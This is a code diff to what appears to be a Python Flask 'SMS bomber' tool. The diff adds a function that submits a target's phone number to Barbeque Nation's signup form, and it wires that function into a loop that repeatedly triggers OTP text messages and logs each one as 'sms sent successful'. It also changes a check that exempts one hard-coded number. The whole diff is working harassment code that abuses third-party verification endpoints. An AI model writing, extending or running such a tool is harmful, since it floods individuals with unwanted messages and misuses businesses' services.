@@ -5,6 +5,8 @@ import threading
 def check(number):
     if number=="8639625032":
         return True
+    elif len(number)!=10:
+        return True
     d={'1','2','3','4','5','6','7','8','9','0'}
     flag=1
     for i in number:
@@ -193,7 +195,27 @@ def medibuddy(number):
     request= requests.post(url,json=data,headers=headers)
     if request.status_code==400:
         return True
-    
+
+def bbq(number):
+    url='https://www.barbequenation.com/getin?_wrapper_format=drupal_modal&ajax_form=1&_wrapper_format=drupal_ajax'
+    data={
+    "form_build_id": "form-29HJEc6VFVzNWswwzdHAJpTA6xdNQiHiipi3fpIm_MQ",
+    "form_id": "bbq_signup_form",
+    "step1[title]": "Mr",
+    "step1[user_name]": "",
+    "step1[country_code]": "+91",
+    "step1[mobile_number]": number,
+    "_triggering_element_name": "op",
+    "_triggering_element_value": "Next",
+    "_drupal_ajax": "1",
+    "ajax_page_state[theme]": "bbq_nation",
+    "ajax_page_state[libraries]": "addtoany/addtoany.front,bbq_blocks/bbq-blocks,bbq_nation/booking,bbq_nation/bootstrap,bbq_nation/delivery,bbq_nation/fcm,bbq_nation/global-styling,bbq_nation/lazyload-images,bbq_nation/moment-js,bbq_nation/notification-styling,bbq_nation/promotions,bbq_nation/voucher-checkout,better_local_tasks/local-tasks,big_pipe/big_pipe,classy/base,classy/messages,classy/node,core/internal.jquery.form,core/normalize,paragraphs/drupal.paragraphs.unpublished,social_auth/auth-icons,social_media_links/social_media_links.theme,system/base,views/views.module"
+    }
+    request=requests.post(url,data=data)
+    if request.status_code==200:
+        return True
+
+
 def main(number,times):
     i=0
     while i<times:
@@ -281,6 +303,10 @@ def main(number,times):
                 print(f"sms sent successful {i}")
         else:
             break
+        if i<times:
+            if bbq(number):
+                i=i+1
+                print(f"sms sent successful {i}")
        
 app=Flask(__name__)
 
